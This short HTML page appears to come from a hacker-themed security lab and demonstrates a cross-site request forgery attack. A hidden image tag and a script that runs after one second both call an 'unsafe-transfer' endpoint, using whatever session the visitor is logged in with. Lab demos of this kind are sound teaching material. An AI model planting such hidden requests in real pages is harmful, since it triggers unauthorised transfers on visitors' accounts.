<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>HACKER_NODE</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <div class="terminal-panel panel-red">
        <h2 style="color: var(--color-red);">[D5] Exploit Node</h2>
        <p style="color: var(--color-red);">> Injecting cross-site payload...</p>

        <div class="terminal-output" style="border-color: var(--color-red);">
            <div id="status">Waiting for target connection...</div>
        </div>
        
        <!-- 隐蔽的 CSRF 攻击载荷 -->
        <img src="/api/d5/unsafe-transfer" style="display: none;">
    </div>
    <a href="/" class="back-link">&lt; RETURN TO TERMINAL</a>

    <script>
        setTimeout(async () => {
            try {
                const res = await fetch('/api/d5/unsafe-transfer');
                const data = await res.json();
                if (data.message) {
                    document.getElementById('status').textContent = "> EXECUTION SUCCESS: " + data.message;
                }
            } catch (e) {
                document.getElementById('status').textContent = "> EXECUTION FAILED: Target not logged in.";
            }
        }, 1000);
    </script>
</body>
</html>
